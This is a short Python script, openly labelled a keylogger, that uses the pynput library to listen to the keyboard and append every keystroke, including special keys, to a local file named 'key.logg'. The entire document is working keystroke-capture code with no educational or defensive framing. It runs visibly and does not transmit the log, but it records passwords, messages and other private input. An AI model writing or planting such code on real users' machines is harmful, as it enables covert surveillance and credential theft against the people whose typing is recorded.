from pynput import keyboard

# This is the name of the file where keys will be saved
log_file = "key.logg"

# Function to write the pressed key into the log file
def on_press(key):
    try:
        # Try to get the character if it's a normal key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like shift, ctrl, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Start listening to keyboard
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... (press Ctrl+C to stop)")
    listener.join()
